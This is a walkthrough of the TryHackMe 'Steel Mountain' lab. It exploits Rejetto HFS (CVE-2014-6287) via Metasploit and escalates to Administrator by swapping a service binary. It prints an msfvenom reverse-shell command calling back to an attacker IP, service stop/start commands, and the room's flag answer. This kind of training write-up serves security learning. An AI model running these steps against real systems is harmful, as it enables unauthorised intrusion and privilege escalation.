# [Steel Mountain](https://tryhackme.com/room/steelmountain)

![SteelMountain](./images/SteelMountain.png)

## Task 1 -  Introduction

<img src="./images/task1-HVTz2Ca.png" height=150  width=auto>

In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our [Kali Room](https://tryhackme.com/room/kali).

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

### Answer the questions below

Deploy the machine.

* Who is the employee of the month?

    `Bill Harper`

    ![task1-image](./images/task1-image.png)

## Task 2 - Initial Access

Now you have deployed the machine, lets get an initial shell!

### Answer the questions below

* Scan the machine with nmap. What is the other port running a web server on?

    `8080`

    Scan resulted [here](./files/task2-nmap)

    ![task2-nmap](./images/task2-nmap.png)

* Take a look at the other web server. What file server is running?

    `Rejetto HTTP File Server`

    * Open Http server via browser 

        ![task2-httpserver](./images/task2-httpserver.png)

    * Open Server information

        ![task2-server-info](./images/task2-server-info.png)

    * Open Link

        ![task2-rejetto.png]

* What is the CVE number to exploit this file server?

    `2014-6287`

    * Search sploit 

        ```
        searchsploit HFS 2.3 -w
        ```

        ![task2-search](./images/task2-search.png)

    * Open link

        ![task2-db](./images/task2-db.png)

* Use Metasploit to get an initial shell. What is the user flag?

    * Run Metasploit and search modul

        ![task2-metasploit](./images/task2-metasploit.png)

    * Show options

        ![task2-options](./images/task2-options.png)

    * Set option and run exploit

        ![task2-exploit](./images/task2-exploit.png)

    * Search file

        ![task2-flag](./images/task2-flag.png)

## Task 3 - Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

### Answer the questions below

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - _"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."_

You can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the upload command in Metasploit to upload the script.

![task3-meterpreter](./images/task3-meterpreter.png)

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering **powershell_shell**:

<img src="./images/task3-powershell.png" height=150  width=auto>

* Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

    `AdvancedSystemCareService9`

    ![task3-servicename](./images/task3-servicename.png)

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.13.52.88 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

![task3-msfvenom](./images/task3-msfvenom.png)

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

![task3-upload](./images/task3-upload.png)

* **Note**: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.

    * Run Windows shell
    
        ```
        shell
        ```

        ![task3-shell](./images/task3-shell.png)
    
    * Stop service
    
        ```
        sc stop AdvancedSystemCareService9
        ```

        ![task3-stop-service](./images/task3-stop-service.png)

    * Copy file upload to the directory original service
    
        ```
        copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
        ```

        ![task3-copy](./images/task3-copy.png)

    * Setup nc listener on out machine
    
        ![task3-listener](./images/task3-listener.png)

    * Then restart the program
        
        ```
        sc start AdvancedSystemCareService9
        ```

        ![task3-start-service](./images/task3-start-service.png)

    * Get a shell as Administrator
    
        ![task3-admin](./images/task3-admin.png)

* What is the root flag?

    `9af5f314f57607c00fd09803a587db80`

    ![task3-root](./images/task3-root.png)

## Task 4 - Access and Escalation Without Metasploit

Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to

### Answer the questions below

To begin we shall be using the same CVE. However, this time let's use this [exploit](https://www.exploit-db.com/exploits/39161).

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*


To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

* Download the exploit and rename file to `exploit`

    ![task4-download](./images/task4-download.png)

* Edit the port/ip local in the script
    
    ![task4-nano](./images/task4-nano.png)

* Edit port for file server in the script

    ![task4-port](./images/task4-port.png)

* Download netcat static binary and rename to `nc.exe`

    ![task4-binary](./images/task4-binary.png)

* Create simple HTTP Server

    ![task4-http](./images/task4-http.png)

* Start listener

    ![task4-listener](./images/task4-listener.png)

* Run the script


Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

![task4-ascservice](./images/task4-ascservice.png)

What powershell -c command could we run to manually find out the service name?

* *Format is "powershell -c "command here"*

Now let's escalate to Administrator with our new found knowledge.

Generate your payload using msfvenom and pull it to the system using powershell.


Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.

First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener!